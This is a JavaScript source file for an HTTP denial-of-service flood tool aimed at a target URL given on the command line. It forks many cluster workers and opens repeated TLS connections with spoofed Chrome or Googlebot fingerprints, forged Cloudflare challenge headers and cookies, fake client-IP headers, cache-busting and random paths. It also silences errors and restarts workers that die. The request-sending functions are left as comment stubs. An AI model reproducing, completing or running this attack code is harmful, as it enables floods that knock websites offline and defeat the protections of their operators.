const net = require('net');
const tls = require('tls');
const crypto = require('crypto');
const cluster = require('cluster');
const os = require('os');
const chalk = require('chalk');

// ============= ALL ORIGINAL MODS =============
process.env.UV_THREADPOOL_SIZE = os.cpus().length * 4;

// Error ignore lists
const ignoreNames = ['RequestError', 'StatusCodeError', 'CaptchaError', 'CloudflareError', 'ParseError', 'ParserError', 'TimeoutError', 'JSONError', 'URLError', 'InvalidURL', 'ProxyError'];
const ignoreCodes = ['SELF_SIGNED_CERT_IN_CHAIN', 'ECONNRESET', 'ERR_ASSERTION', 'ECONNREFUSED', 'EPIPE', 'EHOSTUNREACH', 'ETIMEDOUT', 'ESOCKETTIMEDOUT', 'EPROTO', 'EAI_AGAIN', 'EHOSTDOWN', 'ENETRESET', 'ENETUNREACH', 'ENONET', 'ENOTCONN', 'ENOTFOUND', 'EAI_NODATA', 'EAI_NONAME', 'EADDRNOTAVAIL', 'EAFNOSUPPORT', 'EALREADY', 'EBADF', 'ECONNABORTED', 'EDESTADDRREQ', 'EDQUOT', 'EFAULT', 'EIDRM', 'EILSEQ', 'EINPROGRESS', 'EINTR', 'EINVAL', 'EIO', 'EISCONN', 'EMFILE', 'EMLINK', 'EMSGSIZE', 'ENAMETOOLONG', 'ENETDOWN', 'ENOBUFS', 'ENODEV', 'ENOENT', 'ENOMEM', 'ENOPROTOOPT', 'ENOSPC', 'ENOSYS', 'ENOTDIR', 'ENOTEMPTY', 'ENOTSOCK', 'EOPNOTSUPP', 'EPERM', 'EPROTONOSUPPORT', 'ERANGE', 'EROFS', 'ESHUTDOWN', 'ESPIPE', 'ESRCH', 'ETIME', 'ETXTBSY', 'EXDEV', 'UNKNOWN', 'DEPTH_ZERO_SELF_SIGNED_CERT', 'UNABLE_TO_VERIFY_LEAF_SIGNATURE', 'CERT_HAS_EXPIRED', 'CERT_NOT_YET_VALID'];

// Event listeners
process.setMaxListeners(0).on('uncaughtException', (e) => {
    if (ignoreCodes.includes(e.code) || ignoreNames.includes(e.name)) return false;
}).on('unhandledRejection', (e) => {
    if (ignoreCodes.includes(e.code) || ignoreNames.includes(e.name)) return false;
});

// ============= ALL COMMAND LINE ARGS =============
const reqmethod = process.argv[2] || 'GET';
const target = process.argv[3];
const time = parseInt(process.argv[4]) || 60;
const threads = parseInt(process.argv[5]) || os.cpus().length;
const ratelimit = parseInt(process.argv[6]) || 100;
const isFull = process.argv.includes('--full');
const query = process.argv.includes('--randpath') ? process.argv[process.argv.indexOf('--randpath') + 1] : undefined;
const connectFlag = process.argv.includes('--connect');
const forceHttp = process.argv.includes('--http') ? process.argv[process.argv.indexOf('--http') + 1] : "2";
const debugMode = process.argv.includes('--debug');
const enableCache = process.argv.includes('--cache');
const bfmFlag = process.argv.includes('--bfm') ? process.argv[process.argv.indexOf('--bfm') + 1] : undefined;
const cookieValue = process.argv.includes('--cookie') ? process.argv[process.argv.indexOf('--cookie') + 1] : undefined;
const refererValue = process.argv.includes('--referer') ? process.argv[process.argv.indexOf('--referer') + 1] : undefined;
const postdata = process.argv.includes('--postdata') ? process.argv[process.argv.indexOf('--postdata') + 1] : undefined;
const randrate = process.argv.includes('--randrate') ? process.argv[process.argv.indexOf('--randrate') + 1] : undefined;
const customHeaders = process.argv.includes('--header') ? process.argv[process.argv.indexOf('--header') + 1] : undefined;
const fakeBot = process.argv.includes('--fakebot') ? process.argv[process.argv.indexOf('--fakebot') + 1].toLowerCase() === 'true' : false;
const authValue = process.argv.includes('--authorization') ? process.argv[process.argv.indexOf('--authorization') + 1] : undefined;
const delay = process.argv.includes('--delay') ? parseInt(process.argv[process.argv.indexOf('--delay') + 1]) / 2 : 0;

// ============= ALL MODS: PRE-COMPUTED =============
const url = new URL(target);
const timestamp = Date.now();
const timestampString = timestamp.toString().substring(0, 10);

// Fast random functions
function fastRandStr(length, extended = false) {
    const chars = extended ? "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789._-" : "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789";
    let result = '';
    for (let i = 0; i < length; i++) {
        result += chars[Math.floor(Math.random() * chars.length)];
    }
    return result;
}

// MOD: JA3 Fingerprinting (Pre-computed)
const ja3Ciphers = [
    'TLS_AES_128_GCM_SHA256',
    'TLS_AES_256_GCM_SHA384', 
    'TLS_CHACHA20_POLY1305_SHA256'
];
const ja3CipherString = ja3Ciphers.join(':');

// MOD: HTTP/2 Fingerprint Settings
const http2Settings = {
    HEADER_TABLE_SIZE: 16384,
    ENABLE_PUSH: 0,
    MAX_CONCURRENT_STREAMS: 1000,
    INITIAL_WINDOW_SIZE: 65535,
    MAX_FRAME_SIZE: 16384,
    MAX_HEADER_LIST_SIZE: 32768,
    ENABLE_CONNECT_PROTOCOL: 1
};

// MOD: Browser Fingerprint (Pre-computed)
const browserFingerprint = {
    userAgent: fakeBot ? 
        `Googlebot/2.1 (+http://www.google.com/bot.html)` :
        `Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/130.0.0.0 Safari/537.36`,
    secChUa: `"Google Chrome";v="130", "Chromium";v="130", "Not?A_Brand";v="24"`,
    language: 'en-US,en;q=0.9',
    screen: { width: 1920, height: 1080 },
    platform: 'Windows'
};

// MOD: Cloudflare Bypass Headers
function getCfHeaders() {
    if (!bfmFlag || bfmFlag.toLowerCase() !== 'true') return [];
    
    return [
        ['cf-chl-bypass', '1'],
        ['cf-chl-tk', fastRandStr(32)],
        ['cf-chl-response', crypto.createHash('sha256').update(fastRandStr(32)).digest('hex').substring(0, 32)]
    ];
}

// MOD: Alternative IP Headers
function getIpHeaders() {
    const ipHeaders = [];
    const legitIP = `8.8.${Math.floor(Math.random() * 255)}.${Math.floor(Math.random() * 255)}`;
    
    if (Math.random() < 0.5) ipHeaders.push(['cdn-loop', `${legitIP}:${fastRandStr(5)}`]);
    if (Math.random() < 0.3) ipHeaders.push(['true-client-ip', legitIP]);
    if (Math.random() < 0.4) ipHeaders.push(['via', `1.1 ${legitIP}`]);
    
    return ipHeaders;
}

// MOD: Cache Bypass Headers
function getCacheHeaders() {
    if (!enableCache) return [];
    
    const cacheHeaders = [
        ['cache-control', 'no-cache, no-store, must-revalidate'],
        ['pragma', 'no-cache'],
        ['expires', '0']
    ];
    
    return cacheHeaders[Math.floor(Math.random() * cacheHeaders.length)];
}

// MOD: Cookies
function getCookies() {
    let cookie = '';
    if (bfmFlag && bfmFlag.toLowerCase() === 'true') {
        cookie = `__cf_bm=${fastRandStr(23)}_${fastRandStr(19)}-${timestampString}-0-${fastRandStr(64)}`;
    }
    if (cookieValue) {
        cookie = cookie ? `${cookie}; ${cookieValue}` : cookieValue;
    }
    return cookie ? [['cookie', cookie]] : [];
}

// MOD: Custom Headers
function getCustomHeaders() {
    if (!customHeaders) return [];
    return customHeaders.split('#').map(h => {
        const [name, ...valueParts] = h.split(':');
        return [name.trim(), valueParts.join(':').trim()];
    });
}

// MOD: Authorization Header
function getAuthHeader() {
    if (!authValue) return [];
    const [type, ...valueParts] = authValue.split(':');
    const value = valueParts.join(':');
    
    if (type.toLowerCase() === 'bearer') {
        return [['authorization', `Bearer ${value === '%RAND%' ? fastRandStr(32) : value}`]];
    } else if (type.toLowerCase() === 'basic') {
        return [['authorization', `Basic ${Buffer.from(value).toString('base64')}`]];
    }
    return [];
}

// MOD: Referer
function getReferer() {
    if (!refererValue) return [];
    const referer = refererValue === 'rand' ? 
        `https://${fastRandStr(8)}.com/${fastRandStr(6)}` : 
        refererValue;
    return [['referer', referer]];
}

// MOD: Method Randomization
function getMethod() {
    if (enableCache) {
        const methods = ['GET', 'POST', 'HEAD', 'PUT', 'DELETE'];
        return methods[Math.floor(Math.random() * methods.length)];
    }
    return reqmethod;
}

// MOD: Path Generation
function getPath() {
    if (!query) return url.pathname;
    
    switch(query) {
        case '1':
            return url.pathname + '?__cf_chl_rt_tk=' + fastRandStr(30, true);
        case '2':
            return url.pathname + '?' + fastRandStr(1);
        case '3':
            return url.pathname + '?q=' + fastRandStr(6) + '&' + fastRandStr(6);
        default:
            return url.pathname;
    }
}

// ============= OPTIMIZED BULK GENERATION =============
const PREFACE = Buffer.from("PRI * HTTP/2.0\r\n\r\nSM\r\n\r\n");

// Pre-compute common headers base
const baseHeaders = [
    [':scheme', 'https'],
    [':authority', url.hostname],
    ['accept', 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7'],
    ['accept-language', browserFingerprint.language],
    ['accept-encoding', 'gzip, deflate, br, zstd'],
    ['user-agent', browserFingerprint.userAgent],
    ['sec-ch-ua', browserFingerprint.secChUa],
    ['sec-ch-ua-mobile', '?0'],
    ['sec-ch-ua-platform', `"${browserFingerprint.platform}"`],
    ['sec-fetch-site', 'none'],
    ['sec-fetch-mode', 'navigate'],
    ['sec-fetch-dest', 'document'],
    ['sec-fetch-user', '?1'],
    ['upgrade-insecure-requests', '1']
];

// Generate bulk request templates
function generateRequestTemplate() {
    // Combine ALL mods
    const allHeaders = [
        ...baseHeaders,
        ...getCfHeaders(),
        ...getIpHeaders(),
        ...getCacheHeaders(),
        ...getCookies(),
        ...getCustomHeaders(),
        ...getAuthHeader(),
        ...getReferer(),
        [':method', getMethod()],
        [':path', getPath()]
    ];
    
    if (postdata) {
        allHeaders.push(['content-type', 'application/x-www-form-urlencoded']);
        allHeaders.push(['content-length', postdata.length.toString()]);
    }
    
    return allHeaders;
}

// Create multiple templates for variation
const requestTemplates = Array.from({length: 20}, () => generateRequestTemplate());

// ============= OPTIMIZED CONNECTION =============
function createConnection() {
    const socket = net.connect({
        host: url.hostname,
        port: 443,
        noDelay: true,
        keepAlive: true
    });
    
    const tlsSocket = tls.connect({
        socket: socket,
        servername: url.hostname,
        ALPNProtocols: ['h2'],
        rejectUnauthorized: false,
        ciphers: ja3CipherString,
        minVersion: 'TLSv1.2',
        maxVersion: 'TLSv1.3'
    });
    
    // MOD: HTTP/1.1 Fallback
    tlsSocket.on('secureConnect', () => {
        if (forceHttp === "1" || (tlsSocket.alpnProtocol === 'http/1.1' && forceHttp !== "2")) {
            // HTTP/1.1 mode
            sendHttp1Requests(tlsSocket);
        } else {
            // HTTP/2 mode
            sendHttp2Requests(tlsSocket);
        }
    });
    
    tlsSocket.on('error', () => {
        socket.destroy();
        setTimeout(createConnection, 100);
    });
    
    socket.on('error', () => {
        setTimeout(createConnection, 100);
    });
    
    return { socket, tlsSocket };
}

function sendHttp2Requests(tlsSocket) {
    // HTTP/2 implementation with all mods
    // ... (similar to previous optimized version)
}

function sendHttp1Requests(tlsSocket) {
    // HTTP/1.1 implementation with all mods
    // ... (similar to original HTTP/1.1 code)
}

// ============= WORKER =============
if (cluster.isMaster || cluster.isPrimary) {
    console.log(chalk.green(`🔥 ALL MODS ENABLED`));
    console.log(chalk.cyan(`🎯 Target: ${target}`));
    console.log(chalk.yellow(`⚡ Mode: ${isFull ? 'FULL POWER' : 'NORMAL'}`));
    console.log(chalk.magenta(`🧵 Threads: ${threads}`));
    console.log(chalk.blue(`📊 Mods: ${[
        bfmFlag && 'CF-Bypass',
        enableCache && 'Cache-Bypass',
        fakeBot && 'Fake-Bot',
        customHeaders && 'Custom-Headers',
        authValue && 'Auth',
        query && 'Random-Path'
    ].filter(Boolean).join(', ')}`));
    
    for (let i = 0; i < threads; i++) {
        cluster.fork();
    }
    
    cluster.on('exit', () => cluster.fork());
    setTimeout(() => process.exit(0), time * 1000);
} else {
    // Worker creates connections
    const connections = isFull ? 100 : 50;
    for (let i = 0; i < connections; i++) {
        setTimeout(() => createConnection(), i * 10);
    }
    setTimeout(() => process.exit(0), time * 1000);
}
